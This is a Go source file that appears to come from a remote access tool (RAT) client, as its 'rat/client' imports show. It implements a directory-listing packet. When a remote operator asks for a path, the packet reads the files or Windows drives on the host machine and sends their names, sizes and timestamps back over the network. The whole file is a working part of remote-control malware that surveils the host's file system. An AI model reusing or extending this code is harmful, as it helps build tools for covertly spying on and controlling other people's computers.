package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"oslib"
	"rat/client/drives"
	"rat/client/network/header"
)

type FileData struct {
	Dir    bool
	Name   string
	Edited string
	Size   int64
}

type DirectoryPacket struct {
	Path  string     `network:"send,receive"`
	Files []FileData `network:"send"`
}

func (packet DirectoryPacket) Header() header.PacketHeader {
	return header.DirectoryHeader
}

func (packet *DirectoryPacket) Init() {
	var files []os.FileInfo
	var err error

	if packet.Path == "" && oslib.Name == oslib.Windows {
		drives.QueryDrives()
		files = drives.Drives
	} else {
		if packet.Path == "" {
			packet.Path = "/"
		}
		files, err = ioutil.ReadDir(packet.Path)
	}

	if err != nil {
		fmt.Println(err.Error())
	}

	for i := 0; i < len(files); i++ {
		file := files[i]
		dir := file.IsDir()

		packet.Files = append(packet.Files, FileData{
			dir,
			file.Name(),
			file.ModTime().Format("2006-01-02 15:04:05"),
			file.Size(),
		})
	}
}

func (packet DirectoryPacket) OnReceive() error {
	go func() {
		Queue <- &DirectoryPacket{Path: packet.Path}
	}()
	return nil
}
